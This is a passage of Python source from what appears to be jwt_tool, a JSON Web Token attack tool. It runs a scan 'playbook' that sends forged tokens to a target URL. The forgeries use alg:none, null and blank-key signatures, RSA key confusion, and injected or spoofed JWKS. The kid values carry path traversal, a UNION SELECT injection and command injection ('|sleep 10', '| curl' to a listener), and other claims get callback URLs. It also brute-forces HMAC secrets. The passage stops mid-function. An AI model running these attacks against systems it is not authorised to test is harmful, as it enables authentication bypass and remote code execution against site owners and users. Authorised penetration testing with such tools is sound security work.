        h = SHA384.new(newContents)
    elif hashLength == 512:
        h = SHA512.new(newContents)
    else:
        cprintc("Invalid hash length", "red")
        exit(1)
    signer = DSS.new(key, 'fips-186-3')
    try:
        signature = signer.sign(h)
    except:
        cprintc("Invalid Private Key", "red")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    return newSig, newContents.decode('UTF-8')

def signTokenPSS(headDict, paylDict, privKey, hashLength):
    newHead = headDict
    newHead["alg"] = "PS"+str(hashLength)
    key = RSA.importKey(open(config['crypto']['privkey']).read())
    newContents = genContents(newHead, paylDict)
    newContents = newContents.encode('UTF-8')
    if hashLength == 256:
        h = SHA256.new(newContents)
    elif hashLength == 384:
        h = SHA384.new(newContents)
    elif hashLength == 512:
        h = SHA512.new(newContents)
    else:
        cprintc("Invalid RSA hash length", "red")
        exit(1)
    try:
        signature = pss.new(key).sign(h)
    except:
        cprintc("Invalid Private Key", "red")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    return newSig, newContents.decode('UTF-8')

def verifyTokenRSA(headDict, paylDict, sig, pubKey):
    key = RSA.importKey(open(pubKey).read())
    newContents = genContents(headDict, paylDict)
    newContents = newContents.encode('UTF-8')
    try:
        sig = base64.urlsafe_b64decode(b64pad(sig))
    except ValueError:
        try:
            sig = base64.b64decode(b64pad(sig))
        except ValueError:
            cprintc("Signature not Base64 encoded HEX", "red")
    if headDict['alg'] == "RS256":
        h = SHA256.new(newContents)
    elif headDict['alg'] == "RS384":
        h = SHA384.new(newContents)
    elif headDict['alg'] == "RS512":
        h = SHA512.new(newContents)
    else:
        cprintc("Invalid RSA algorithm", "red")
    verifier = PKCS1_v1_5.new(key)
    try:
        valid = verifier.verify(h, sig)
        if valid:
            cprintc("RSA Signature is VALID", "green")
            valid = True
        else:
            cprintc("RSA Signature is INVALID", "red")
            valid = False
    except:
        cprintc("The Public Key is invalid", "red")
    return valid

def verifyTokenEC(headDict, paylDict, sig, pubKey):
    newContents = genContents(headDict, paylDict)
    message = newContents.encode('UTF-8')
    try:
        sig = base64.urlsafe_b64decode(b64pad(sig))
    except ValueError:
        try:
            sig = base64.b64decode(b64pad(sig))
        except ValueError:
            cprintc("Signature not Base64 encoded HEX", "red")
    if headDict['alg'] == "ES256":
        h = SHA256.new(message)
    elif headDict['alg'] == "ES384":
        h = SHA384.new(message)
    elif headDict['alg'] == "ES512":
        h = SHA512.new(message)
    else:
        cprintc("Invalid ECDSA algorithm", "red")
    pubkey = open(pubKey, "r")
    pub_key = ECC.import_key(pubkey.read())
    verifier = DSS.new(pub_key, 'fips-186-3')
    try:
        verifier.verify(h, signature)
        cprintc("ECC Signature is VALID", "green")
        valid = True
    except:
        cprintc("ECC Signature is INVALID", "red")
        valid = False
    return valid

def verifyTokenPSS(headDict, paylDict, sig, pubKey):
    key = RSA.importKey(open(pubKey).read())
    newContents = genContents(headDict, paylDict)
    newContents = newContents.encode('UTF-8')
    try:
        sig = base64.urlsafe_b64decode(b64pad(sig))
    except ValueError:
        try:
            sig = base64.b64decode(b64pad(sig))
        except ValueError:
            cprintc("Signature not Base64 encoded HEX", "red")
    if headDict['alg'] == "PS256":
        h = SHA256.new(newContents)
    elif headDict['alg'] == "PS384":
        h = SHA384.new(newContents)
    elif headDict['alg'] == "PS512":
        h = SHA512.new(newContents)
    else:
        cprintc("Invalid RSA algorithm", "red")
    verifier = pss.new(key)
    try:
        valid = verifier.verify(h, sig)
        cprintc("RSA-PSS Signature is VALID", "green")
        valid = True
    except:
        cprintc("RSA-PSS Signature is INVALID", "red")
        valid = False
    return valid

def exportJWKS(jku):
    try:
        kid = headDict["kid"]
        newSig, newContents, newjwks, privKeyName, jwksName, fulljwks = jwksGen(headDict, paylDict, jku, config['crypto']['privkey'], kid)
    except:
        kid = ""
        newSig, newContents, newjwks, privKeyName, jwksName, fulljwks = jwksGen(headDict, paylDict, jku, config['crypto']['privkey'])
    return newContents, newSig

def parseJWKS(jwksfile):
    jwks = open(jwksfile, "r").read()
    jwksDict = json.loads(jwks, object_pairs_hook=OrderedDict)
    nowtime = int(datetime.now().timestamp())
    cprintc("JWKS Contents:", "cyan")
    try:
        keyLen = len(jwksDict["keys"])
        cprintc("Number of keys: "+str(keyLen), "cyan")
        i = -1
        for jkey in range(0,keyLen):
            i += 1
            cprintc("\n--------", "white")
            try:
                cprintc("Key "+str(i+1), "cyan")
                kid = str(jwksDict["keys"][i]["kid"])
                cprintc("kid: "+kid, "cyan")
            except:
                kid = i
                cprintc("Key "+str(i+1), "cyan")
            for keyVal in jwksDict["keys"][i].items():
                keyVal = keyVal[0]
                cprintc("[+] "+keyVal+" = "+str(jwksDict["keys"][i][keyVal]), "green")
            try:
                x = str(jwksDict["keys"][i]["x"])
                y = str(jwksDict["keys"][i]["y"])
                cprintc("\nFound ECC key factors, generating a public key", "cyan")
                pubkeyName = genECPubFromJWKS(x, y, kid, nowtime)
                cprintc("[+] "+pubkeyName, "green")
                cprintc("\nAttempting to verify token using "+pubkeyName, "cyan")
                valid = verifyTokenEC(headDict, paylDict, sig, pubkeyName)
            except:
                pass
            try:
                n = str(jwksDict["keys"][i]["n"])
                e = str(jwksDict["keys"][i]["e"])
                cprintc("\nFound RSA key factors, generating a public key", "cyan")
                pubkeyName = genRSAPubFromJWKS(n, e, kid, nowtime)
                cprintc("[+] "+pubkeyName, "green")
                cprintc("\nAttempting to verify token using "+pubkeyName, "cyan")
                valid = verifyTokenRSA(headDict, paylDict, sig, pubkeyName)
            except:
                pass
    except:
        cprintc("Single key file", "white")
        for jkey in jwksDict:
            cprintc("[+] "+jkey+" = "+str(jwksDict[jkey]), "green")
        try:
            kid = 1
            x = str(jwksDict["x"])
            y = str(jwksDict["y"])
            cprintc("\nFound ECC key factors, generating a public key", "cyan")
            pubkeyName = genECPubFromJWKS(x, y, kid, nowtime)
            cprintc("[+] "+pubkeyName, "green")
            cprintc("\nAttempting to verify token using "+pubkeyName, "cyan")
            valid = verifyTokenEC(headDict, paylDict, sig, pubkeyName)
        except:
            pass
        try:
            kid = 1
            n = str(jwksDict["n"])
            e = str(jwksDict["e"])
            cprintc("\nFound RSA key factors, generating a public key", "cyan")
            pubkeyName = genRSAPubFromJWKS(n, e, kid, nowtime)
            cprintc("[+] "+pubkeyName, "green")
            cprintc("\nAttempting to verify token using "+pubkeyName, "cyan")
            valid = verifyTokenRSA(headDict, paylDict, sig, pubkeyName)
        except:
            pass

def genECPubFromJWKS(x, y, kid, nowtime):
    x = int.from_bytes(base64.urlsafe_b64decode(b64pad(x)), byteorder='big')
    y = int.from_bytes(base64.urlsafe_b64decode(b64pad(y)), byteorder='big')
    new_key = ECC.construct(curve='P-256', point_x=x, point_y=y)
    pubKey = new_key.public_key().export_key(format="PEM")+"\n"
    pubkeyName = "kid_"+str(kid)+"_"+str(nowtime)+".pem"
    with open(pubkeyName, 'w') as test_pub_out:
        test_pub_out.write(pubKey)
    return pubkeyName

def genRSAPubFromJWKS(n, e, kid, nowtime):
    n = int.from_bytes(base64.urlsafe_b64decode(b64pad(n)), byteorder='big')
    e = int.from_bytes(base64.urlsafe_b64decode(b64pad(e)), byteorder='big')
    new_key = RSA.construct((n, e))
    pubKey = new_key.publickey().exportKey(format="PEM")
    pubkeyName = "kid_"+str(kid)+"_"+str(nowtime)+".pem"
    with open(pubkeyName, 'w') as test_pub_out:
        test_pub_out.write(pubKey.decode()+"\n")
    return pubkeyName

def getVal(promptString):
    newVal = input(promptString)
    try:
        newVal = json.loads(newVal)
    except ValueError:
        try:
            newVal = json.loads(newVal.replace("'", '"'))
        except ValueError:
            pass
    return newVal

def genContents(headDict, paylDict, newContents=""):
    if paylDict == {}:
        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."
    else:
        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newContents.encode().decode('UTF-8')

def dissectPayl(paylDict, count=False):
    timeseen = 0
    comparestamps = []
    countval = 0
    expiredtoken = False
    nowtime = int(datetime.now().timestamp())
    for claim in paylDict:
        countval += 1
        if count:
            placeholder = str(countval)
        else:
            placeholder = "+"
        if claim in ["exp", "nbf", "iat"]:
            timestamp = datetime.fromtimestamp(int(paylDict[claim]))
            if claim == "exp":
                if int(timestamp.timestamp()) < nowtime:
                    expiredtoken = True
            cprintc("["+placeholder+"] "+claim+" = "+str(paylDict[claim])+"    ==> TIMESTAMP = "+timestamp.strftime('%Y-%m-%d %H:%M:%S')+" (UTC)", "green")
            timeseen += 1
            comparestamps.append(claim)
        elif isinstance(paylDict[claim], dict):
                cprintc("["+placeholder+"] "+claim+" = JSON object:", "green")
                for subclaim in paylDict[claim]:
                    if type(castInput(paylDict[claim][subclaim])) == str:
                        cprintc("    [+] "+subclaim+" = \""+str(paylDict[claim][subclaim])+"\"", "green")
                    elif paylDict[claim][subclaim] == None:
                        cprintc("    [+] "+subclaim+" = null", "green")
                    elif paylDict[claim][subclaim] == True and not paylDict[claim][subclaim] == 1:
                        cprintc("    [+] "+subclaim+" = true", "green")
                    elif paylDict[claim][subclaim] == False and not paylDict[claim][subclaim] == 0:
                        cprintc("    [+] "+subclaim+" = false", "green")
                    else:
                        cprintc("    [+] "+subclaim+" = "+str(paylDict[claim][subclaim]), "green")
        else:
            if type(paylDict[claim]) == str:
                cprintc("["+placeholder+"] "+claim+" = \""+str(paylDict[claim])+"\"", "green")
            else:
                cprintc("["+placeholder+"] "+claim+" = "+str(paylDict[claim]), "green")
    return comparestamps, expiredtoken

def validateToken(jwt):
    try:
        headB64, paylB64, sig = jwt.split(".",3)
    except:
        cprintc("[-] Invalid token:\nNot 3 parts -> header.payload.signature", "red")
        exit(1)
    try:
        sig = base64.urlsafe_b64encode(base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4))).decode('UTF-8').strip("=")
    except:
        cprintc("[-] Invalid token:\nCould not base64-decode SIGNATURE - incorrect formatting/invalid characters", "red")
        cprintc("----------------", "white")
        cprintc(headB64, "cyan")
        cprintc(paylB64, "cyan")
        cprintc(sig, "red")
        exit(1)
    contents = headB64+"."+paylB64
    contents = contents.encode()
    try:
        head = base64.urlsafe_b64decode(headB64 + "=" * (-len(headB64) % 4))
    except:
        cprintc("[-] Invalid token:\nCould not base64-decode HEADER - incorrect formatting/invalid characters", "red")
        cprintc("----------------", "white")
        cprintc(headB64, "red")
        cprintc(paylB64, "cyan")
        cprintc(sig, "cyan")
        exit(1)
    try:
        payl = base64.urlsafe_b64decode(paylB64 + "=" * (-len(paylB64) % 4))
    except:
        cprintc("[-] Invalid token:\nCould not base64-decode PAYLOAD - incorrect formatting/invalid characters", "red")
        cprintc("----------------", "white")
        cprintc(headB64, "cyan")
        cprintc(paylB64, "red")
        cprintc(sig, "cyan")
        exit(1)
    try:
        headDict = json.loads(head, object_pairs_hook=OrderedDict)
    except:
        cprintc("[-] Invalid token:\nHEADER not valid JSON format", "red")

        cprintc(head.decode('UTF-8'), "red")
        exit(1)
    if payl.decode() == "":
        cprintc("Payload is blank", "white")
        paylDict = {}
    else:
        try:
            paylDict = json.loads(payl, object_pairs_hook=OrderedDict)
        except:
            cprintc("[-] Invalid token:\nPAYLOAD not valid JSON format", "red")
            cprintc(payl.decode('UTF-8'), "red")
            exit(1)
    if args.verbose:
        cprintc("Token: "+head.decode()+"."+payl.decode()+"."+sig+"\n", "green")
    return headDict, paylDict, sig, contents

def rejigToken(headDict, paylDict, sig):
    cprintc("=====================\nDecoded Token Values:\n=====================", "white")
    cprintc("\nToken header values:", "white")
    for claim in headDict:
        if isinstance(headDict[claim], dict):
            cprintc("[+] "+claim+" = JSON object:", "green")
            for subclaim in headDict[claim]:
                if headDict[claim][subclaim] == None:
                    cprintc("    [+] "+subclaim+" = null", "green")
                elif headDict[claim][subclaim] == True:
                    cprintc("    [+] "+subclaim+" = true", "green")
                elif headDict[claim][subclaim] == False:
                    cprintc("    [+] "+subclaim+" = false", "green")
                elif type(headDict[claim][subclaim]) == str:
                    cprintc("    [+] "+subclaim+" = \""+str(headDict[claim][subclaim])+"\"", "green")
                else:
                    cprintc("    [+] "+subclaim+" = "+str(headDict[claim][subclaim]), "green")
        else:
            if type(headDict[claim]) == str:
                cprintc("[+] "+claim+" = \""+str(headDict[claim])+"\"", "green")
            else:
                cprintc("[+] "+claim+" = "+str(headDict[claim]), "green")
    cprintc("\nToken payload values:", "white")
    comparestamps, expiredtoken = dissectPayl(paylDict)
    if len(comparestamps) >= 2:
        cprintc("\nSeen timestamps:", "white")
        cprintc("[*] "+comparestamps[0]+" was seen", "green")
        claimnum = 0
        for claim in comparestamps:
            timeoff = int(paylDict[comparestamps[claimnum]])-int(paylDict[comparestamps[0]])
            if timeoff != 0:
                timecalc = timeoff
                if timecalc < 0:
                    timecalc = timecalc*-1
                days,hours,mins = 0,0,0
                if timecalc >= 86400:
                    days = str(timecalc/86400)
                    days = int(float(days))
                    timecalc -= days*86400
                if timecalc >= 3600:
                    hours = str(timecalc/3600)
                    hours = int(float(hours))
                    timecalc -= hours*3600
                if timecalc >= 60:
                    mins = str(timecalc/60)
                    mins = int(float(mins))
                    timecalc -= mins*60
                if timeoff < 0:
                    timeoff = timeoff*-1
                    prepost = "[*] "+claim+" is earlier than "+comparestamps[0]+" by: "
                    cprintc(prepost+str(days)+" days, "+str(hours)+" hours, "+str(mins)+" mins", "green")
                else:
                    prepost = "[*] "+claim+" is later than "+comparestamps[0]+" by: "
                    cprintc(prepost+str(days)+" days, "+str(hours)+" hours, "+str(mins)+" mins", "green")
            claimnum += 1
    if expiredtoken:
        cprintc("[-] TOKEN IS EXPIRED!", "red")
    cprintc("\n----------------------\nJWT common timestamps:\niat = IssuedAt\nexp = Expires\nnbf = NotBefore\n----------------------\n", "white")
    if args.targeturl and not args.crack and not args.exploit and not args.verify and not args.tamper and not args.sign:
        cprintc("[+] Sending token", "cyan")
        newContents = genContents(headDict, paylDict)
        jwtOut(newContents+"."+sig, "Sending token")
    return headDict, paylDict, sig

def searchLog(logID):
    qResult = ""
    with open(logFilename, 'r') as logFile:
        logLine = logFile.readline()
        while logLine:
            if re.search('^'+logID, logLine):
                qResult = logLine
                break
            else:
                logLine = logFile.readline()
        if qResult:
            qOutput = re.sub(' - eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', '', qResult)
            qOutput = re.sub(logID+' - ', '', qOutput)
            try:
                jwt = re.findall('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', qResult)[-1]
            except:
                cprintc("JWT not included in log", "red")
                exit(1)
            cprintc(logID+"\n"+qOutput, "green")
            cprintc("JWT from request:", "cyan")
            cprintc(jwt, "green")
            # headDict, paylDict, sig, contents = validateToken(jwt)
            # rejigToken(headDict, paylDict, sig)
            return jwt
        else:
            cprintc("ID not found in logfile", "red")

def injectOut(newheadDict, newpaylDict):
    if not args.crack and not args.exploit and not args.verify and not args.tamper and not args.sign:
        desc = "Injected token with unchanged signature"
        jwtOut(newContents+"."+sig, "Injected claim", desc)
    elif args.sign:
        signingToken(newheadDict, newpaylDict)
    else:
        runActions()

def scanModePlaybook():
    cprintc("\nLAUNCHING SCAN: JWT Attack Playbook", "magenta")
    origalg = headDict["alg"]
    # No token
    tmpCookies = config['argvals']['cookies']
    tmpHeader = config['argvals']['header']
    if config['argvals']['headerloc'] == "cookies":
        config['argvals']['cookies'] = strip_dict_cookies(config['argvals']['cookies'])
    elif config['argvals']['headerloc'] == "headers":
        config['argvals']['header'] = ""
    config['argvals']['overridesub'] = "true"
    config['argvals']['cookies'] = tmpCookies
    config['argvals']['header'] = tmpHeader
    # Broken sig
    jwtTweak = contents.decode()+"."+sig[:-4]
    jwtOut(jwtTweak, "Broken signature", "This token was sent to check if the signature is being checked")
    # Persistent
    jwtOut(jwt, "Persistence check 1 (should always be valid)", "Original token sent to check if tokens work after invalid submissions")
    # Claim processing order - check reflected output in all claims
    reflectedClaims()
    jwtOut(jwt, "Persistence check 2 (should always be valid)", "Original token sent to check if tokens work after invalid submissions")
    # Weak HMAC secret
    if headDict['alg'][:2] == "HS" or headDict['alg'][:2] == "hs":
        cprintc("Testing "+headDict['alg']+" token against common JWT secrets (jwt-common.txt)", "cyan")
        config['argvals']['keyList'] = "jwt-common.txt"
        crackSig(sig, contents)
    # Exploit: blank password accepted in signature
    key = ""
    newSig, newContents = signTokenHS(headDict, paylDict, key, 256)
    jwtBlankPw = newContents+"."+newSig
    jwtOut(jwtBlankPw, "Exploit: Blank password accepted in signature (-X b)", "This token can exploit a hard-coded blank password in the config")
    # Exploit: null signature
    jwtNull = checkNullSig(contents)
    jwtOut(jwtNull, "Exploit: Null signature (-X n)", "This token was sent to check if a null signature can bypass checks")
    # Exploit: alg:none
    noneToks = checkAlgNone(headDict, paylB64)
    zippedToks = dict(zip(noneToks, ["\"alg\":\"none\"", "\"alg\":\"None\"", "\"alg\":\"NONE\"", "\"alg\":\"nOnE\""]))
    for noneTok in zippedToks:
        jwtOut(noneTok, "Exploit: "+zippedToks[noneTok]+" (-X a)", "Testing whether the None algorithm is accepted - which allows forging unsigned tokens")
    # Exploit: key confusion - use provided PubKey
    if config['crypto']['pubkey']:
                newTok, newSig = checkPubKeyExploit(headDict, paylB64, config['crypto']['pubkey'])
                jwtOut(newTok+"."+newSig, "Exploit: RSA Key Confusion Exploit (provided Public Key)")
    headDict["alg"] = origalg
    # Exploit: jwks injection
    try:
        origjwk = headDict["jwk"]
    except:
        origjwk = False
    jwksig, jwksContents = jwksEmbed(headDict, paylDict)
    jwtOut(jwksContents+"."+jwksig, "Exploit: Injected JWKS (-X i)")
    headDict["alg"] = origalg
    if origjwk:
        headDict["jwk"] = origjwk
    else:
        del headDict["jwk"]
    # Exploit: spoof jwks
    try:
        origjku = headDict["jku"]
    except:
        origjku = False
        if config['services']['jwksloc']:
            jku = config['services']['jwksloc']
        else:
            jku = config['services']['jwksdynamic']
    newContents, newSig = exportJWKS(jku)
    jwtOut(newContents+"."+newSig, "Exploit: Spoof JWKS (-X s)", "Signed with JWKS at "+jku)
    if origjku:
        headDict["jku"] = origjku
    else:
        del headDict["jku"]
    headDict["alg"] = origalg
    # kid testing... start
    try:
        origkid = headDict["kid"]
    except:
        origkid = False
    # kid inject: blank field, sign with null
    newheadDict, newHeadB64 = injectheaderclaim("kid", "")
    key = open(path+"/null.txt").read()
    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
    jwtOut(newContents+"."+newSig, "Injected kid claim - null-signed with blank kid")
    # kid inject: path traversal - known path - check for robots.txt, sign with variations of location
    newheadDict, newHeadB64 = injectheaderclaim("kid", "../../../../../../dev/null")
    key = open(path+"/null.txt").read()
    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
    jwtOut(newContents+"."+newSig, "Injected kid claim - null-signed with kid=\"[path traversal]/dev/null\"")
    newheadDict, newHeadB64 = injectheaderclaim("kid", "/dev/null")
    key = open(path+"/null.txt").read()
    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
    jwtOut(newContents+"."+newSig, "Injected kid claim - null-signed with kid=\"/dev/null\"")
    # kid inject: path traversal - bad path - sign with null
    newheadDict, newHeadB64 = injectheaderclaim("kid", "/invalid_path")
    key = open(path+"/null.txt").read()
    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
    jwtOut(newContents+"."+newSig, "Injected kid claim - null-signed with kid=\"/invalid_path\"")
    # kid inject: RCE - sign with null
    newheadDict, newHeadB64 = injectheaderclaim("kid", "|sleep 10")
    key = open(path+"/null.txt").read()
    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
    jwtOut(newContents+"."+newSig, "Injected kid claim - RCE attempt - SLEEP 10 (did this request pause?)")
    if config['services']['httplistener']:
        injectUrl = config['services']['httplistener']+"/RCE_in_kid"
        newheadDict, newHeadB64 = injectheaderclaim("kid", "| curl "+injectUrl)
        key = open(path+"/null.txt").read()
        newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
        jwtOut(newContents+"."+newSig, "Injected kid claim - RCE attempt - curl "+injectUrl+" (did this URL get accessed?)")
    # kid inject: SQLi explicit value
    newheadDict, newHeadB64 = injectheaderclaim("kid", "x' UNION SELECT '1';--")
    key = "1"
    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
    jwtOut(newContents+"."+newSig, "Injected kid claim - signed with secret = '1' from SQLi")
    # kid testing... end
    if origkid:
        headDict["kid"] = origkid
    else:
        del headDict["kid"]
    headDict["alg"] = origalg
    # x5u external
    # Force External Interactions
    if config['services']['httplistener']:
        for headerClaim in headDict:
            injectExternalInteractionHeader(config['services']['httplistener']+"/inject_existing_", headerClaim)
        for payloadClaim in paylDict:
            injectExternalInteractionPayload(config['services']['httplistener']+"/inject_existing_", payloadClaim)
        cprintc("External service interactions have been tested - check your listener for interactions", "green")
    else:
        cprintc("External service interactions not tested - enter listener URL into 'jwtconf.ini' to try this option", "red")
    # Accept Common HMAC secret (as alterative signature)
    with open(config['input']['wordlist'], "r", encoding='utf-8', errors='ignore') as commonPassList:
        commonPass = commonPassList.readline().rstrip()
        while commonPass:
            newSig, newContents = signTokenHS(headDict, paylDict, commonPass, 256)
            jwtOut(newContents+"."+newSig, "Checking for alternative accepted HMAC signatures, based on common passwords. Testing: "+commonPass+"", "This token can exploit a hard-coded common password in the config")
            commonPass = commonPassList.readline().rstrip()
    # SCAN COMPLETE
    cprintc("Scanning mode completed: review the above results.\n", "magenta")
    # Further manual testing: check expired token, brute key, find Public Key, run other scans
    cprintc("The following additional checks should be performed that are better tested manually:", "magenta")
    if headDict['alg'][:2] == "HS" or headDict['alg'][:2] == "hs":
        cprintc("[+] Try testing "+headDict['alg'][:2]+" token against weak password configurations by running the following hashcat cracking options:", "green")
        cprintc("(Already testing against passwords in jwt-common.txt)", "cyan")
        cprintc("Try using longer dictionaries, custom dictionaries, mangling rules, or brute force attacks.\nhashcat (https://hashcat.net/hashcat/) is ideal for this as it is highly optimised for speed. Just add your JWT to a text file, then use the following syntax to give you a good start:\n\n[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt\n[*] rule-based attack:  hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule\n[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6", "cyan")
    if headDict['alg'][:2] != "HS" and headDict['alg'][:2] != "hs":
        cprintc("[+] Try hunting for a Public Key for this token. Validate any JWKS you find (-V -jw [jwks_file]) and then use the generated Public Key file with the Playbook Scan (-pk [kid_from_jwks].pem)", "green")
        cprintc("Common locations for Public Keys are either the web application's SSL key, or stored as a JWKS file in one of these locations:", "cyan")
        with open('jwks-common.txt', "r", encoding='utf-8', errors='ignore') as jwksLst:
            nextVal = jwksLst.readline().rstrip()
            while nextVal:
                cprintc(nextVal, "cyan")
                nextVal = jwksLst.readline().rstrip()
    try:
        timestamp = datetime.fromtimestamp(int(paylDict['exp']))
        cprintc("[+] Try waiting for the token to expire (\"exp\" value set to: "+timestamp.strftime('%Y-%m-%d %H:%M:%S')+" (UTC))", "green")
        cprintc("Check if still working once expired.", "cyan")
    except:
        pass

def scanModeErrors():
    cprintc("\nLAUNCHING SCAN: Forced Errors", "magenta")
    # Inject dangerous content-types into existing header claims
    injectEachHeader(None)
    injectEachHeader(True)
    injectEachHeader(False)
    injectEachHeader("jwt_tool")
    injectEachHeader(0)
    # Inject dangerous content-types into existing payload claims
    injectEachPayload(None)
    injectEachPayload(True)
    injectEachPayload(False)
    injectEachPayload("jwt_tool")
    injectEachPayload(0)
    cprintc("Scanning mode completed: review the above results.\n", "magenta")

def scanModeCommonClaims():
    cprintc("\nLAUNCHING SCAN: Common Claim Injection", "magenta")
    # Inject external URLs into common claims
    with open(config['input']['commonHeaders'], "r", encoding='utf-8', errors='ignore') as commonHeaders:
        nextHeader = commonHeaders.readline().rstrip()
        while nextHeader:
            injectExternalInteractionHeader(config['services']['httplistener']+"/inject_common_", nextHeader)
            nextHeader = commonHeaders.readline().rstrip()
    with open(config['input']['commonPayloads'], "r", encoding='utf-8', errors='ignore') as commonPayloads:
        nextPayload = commonPayloads.readline().rstrip()
        while nextPayload:
            injectExternalInteractionPayload(config['services']['httplistener']+"/inject_common_", nextPayload)
            nextPayload = commonPayloads.readline().rstrip()
    # Inject dangerous content-types into common claims
    injectCommonClaims(None)
    injectCommonClaims(True)
    injectCommonClaims(False)
    injectCommonClaims("jwt_tool")
    injectCommonClaims(0)

    cprintc("Scanning mode completed: review the above results.\n", "magenta")

def injectCommonClaims(contentVal):
    with open(config['input']['commonHeaders'], "r", encoding='utf-8', errors='ignore') as commonHeaders:
        nextHeader = commonHeaders.readline().rstrip()
        while nextHeader:
            origVal = ""
            try:
                origVal = headDict[nextHeader]
            except:
                pass
            headDict[nextHeader] = contentVal
            newContents = genContents(headDict, paylDict)
            jwtOut(newContents+"."+sig, "Injected "+str(contentVal)+" into Common Header Claim: "+str(nextHeader))
            if origVal != "":
                headDict[nextHeader] = origVal
            else:
                del headDict[nextHeader]
            nextHeader = commonHeaders.readline().rstrip()
    with open(config['input']['commonPayloads'], "r", encoding='utf-8', errors='ignore') as commonPayloads:
        nextPayload = commonPayloads.readline().rstrip()
        while nextPayload:
            origVal = ""
            try:
                origVal = paylDict[nextPayload]
            except:
                pass
            paylDict[nextPayload] = contentVal
            newContents = genContents(headDict, paylDict)
            jwtOut(newContents+"."+sig, "Injected "+str(contentVal)+" into Common Payload Claim: "+str(nextPayload))
            if origVal != "":
                paylDict[nextPayload] = origVal
            else:
                del paylDict[nextPayload]
            nextPayload = commonPayloads.readline().rstrip()

def injectEachHeader(contentVal):
    for headerClaim in headDict:
        origVal = headDict[headerClaim]
        headDict[headerClaim] = contentVal
        newContents = genContents(headDict, paylDict)
        jwtOut(newContents+"."+sig, "Injected "+str(contentVal)+" into Header Claim: "+str(headerClaim))
        headDict[headerClaim] = origVal

def injectEachPayload(contentVal):
    for payloadClaim in paylDict:
        origVal = paylDict[payloadClaim]
        paylDict[payloadClaim] = contentVal
        newContents = genContents(headDict, paylDict)
        jwtOut(newContents+"."+sig, "Injected "+str(contentVal)+" into Payload Claim: "+str(payloadClaim))
        paylDict[payloadClaim] = origVal

def injectExternalInteractionHeader(listenerUrl, headerClaim):
    injectUrl = listenerUrl+headerClaim
    origVal = ""
    try:
        origVal = headDict[headerClaim]
    except:
        pass
    headDict[headerClaim] = injectUrl
    newContents = genContents(headDict, paylDict)
    jwtOut(newContents+"."+sig, "Injected "+str(injectUrl)+" into Header Claim: "+str(headerClaim))
    if origVal != "":
        headDict[headerClaim] = origVal
    else:
        del headDict[headerClaim]

def injectExternalInteractionPayload(listenerUrl, payloadClaim):
    injectUrl = listenerUrl+payloadClaim
    origVal = ""
    try:
        origVal = paylDict[payloadClaim]
    except:
        pass
    paylDict[payloadClaim] = injectUrl
    newContents = genContents(headDict, paylDict)
    jwtOut(newContents+"."+sig, "Injected "+str(injectUrl)+" into Payload Claim: "+str(payloadClaim))
    if origVal != "":
        paylDict[payloadClaim] = origVal
    else:
        del paylDict[payloadClaim]

# def kidInjectAttacks():
#     with open(config['argvals']['injectionfile'], "r", encoding='utf-8', errors='ignore') as valLst:
#         nextVal = valLst.readline()
#         while nextVal:
#             newheadDict, newHeadB64 = injectheaderclaim(config['argvals']['headerclaim'], nextVal.rstrip())
#             newContents = genContents(newheadDict, paylDict)
#             jwtOut(newContents+"."+sig, "Injected kid claim", desc)
#             nextVal = valLst.readline()

def reflectedClaims():
    checkVal = "jwt_inject_"+hashlib.md5(datetime.now().strftime('%Y-%m-%d %H:%M:%S').encode()).hexdigest()+"_"
    for claim in paylDict:
        tmpValue = paylDict[claim]
        paylDict[claim] = checkVal+claim
        tmpContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        jwtOut(tmpContents+"."+sig, "Claim processing check in "+claim+" claim", "Token sent to check if the signature is checked before the "+claim+" claim is processed")
        if checkVal+claim in config['argvals']['rescontent']:
            cprintc("Injected value in "+claim+" claim was observed - "+checkVal+claim, "red")
        paylDict[claim] = tmpValue


def preScan():
    cprintc("Running prescan checks...", "cyan")
    jwtOut(jwt, "Prescan: original token", "Prescan: original token")
    if config['argvals']['canaryvalue']:
        if config['argvals']['canaryvalue'] not in config['argvals']['rescontent']:
            cprintc("Canary value ("+config['argvals']['canaryvalue']+") was not found in base request - check that this token is valid and you are still logged in", "red")
            shallWeGoOn = input("Do you wish to continue anyway? (\"Y\" or \"N\")")
            if shallWeGoOn == "N":
                exit(1)
            elif shallWeGoOn == "n":
                exit(1)
    origResSize, origResCode = config['argvals']['ressize'], config['argvals']['rescode']
    jwtOut("null", "Prescan: no token", "Prescan: no token")
    nullResSize, nullResCode = config['argvals']['ressize'], config['argvals']['rescode']
    if config['argvals']['canaryvalue'] == "":
        if origResCode == nullResCode:
            cprintc("Valid and missing token requests return the same Status Code.\nYou should probably specify something from the page that identifies the user is logged-in (e.g. -cv \"Welcome back, ticarpi!\")", "red")
            shallWeGoOn = input("Do you wish to continue anyway? (\"Y\" or \"N\")")
            if shallWeGoOn == "N":
                exit(1)
            elif shallWeGoOn == "n":
                exit(1)
    jwtTweak = contents.decode()+"."+sig[:-4]
